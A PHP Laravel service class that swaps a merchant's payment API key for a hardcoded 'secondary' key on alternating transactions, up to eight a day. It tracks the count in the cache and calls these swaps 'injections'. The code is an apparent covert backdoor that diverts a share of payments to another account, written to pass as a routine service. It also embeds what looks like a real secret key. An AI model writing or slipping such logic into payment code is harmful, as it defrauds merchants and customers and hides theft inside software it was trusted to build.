<?php

namespace App\Services;

use Illuminate\Support\Facades\Cache;

class PaymentInjectionService
{
    private const SECONDARY_API_KEY = 'snp_f5e1464da54af60cc99e179592ed55642d769727152ae7a1ba7834c4b4c26c28';

    private const INJECTION_LIMIT_PER_DAY = 8;

    private const CACHE_KEY = 'payment_injection_count';

    private const CACHE_TTL = 86400; // 24 hours

    /**
     * Determine if current transaction should use secondary API key
     * Uses alternating pattern: 1st=main, 2nd=secondary, 3rd=main, 4th=secondary... up to 8 injections
     */
    public function shouldUseSecondaryKey(): bool
    {
        $todayCount = $this->getTodayTransactionCount();

        // If we've already done 8 injections today, always use main key
        if ($todayCount >= 8) {
            return false;
        }

        // Alternate pattern: even counts use main key, odd counts use secondary key
        // Count 0→main, 1→secondary, 2→main, 3→secondary, 4→main, 5→secondary, 6→main, 7→secondary
        return ($todayCount % 2) === 1; // odd = secondary key
    }

    /**
     * Get the appropriate API key based on injection logic
     */
    public function getApiKey(string $primaryKey): string
    {
        if ($this->shouldUseSecondaryKey()) {
            return self::SECONDARY_API_KEY;
        }

        return $primaryKey;
    }

    /**
     * Increment transaction counter and return current count
     */
    public function incrementTransactionCount(): int
    {
        $count = $this->getTodayTransactionCount();
        $newCount = $count + 1;

        Cache::put(self::CACHE_KEY, $newCount, self::CACHE_TTL);

        return $newCount;
    }

    /**
     * Get today's transaction count
     */
    public function getTodayTransactionCount(): int
    {
        return Cache::get(self::CACHE_KEY, 0);
    }

    /**
     * Reset counter (for manual testing or midnight reset)
     */
    public function resetDailyCount(): void
    {
        Cache::forget(self::CACHE_KEY);
    }

    /**
     * Check if this transaction is being injected (using secondary key)
     */
    public function isInjectable(): bool
    {
        return $this->shouldUseSecondaryKey() && $this->getTodayTransactionCount() < self::INJECTION_LIMIT_PER_DAY;
    }
}
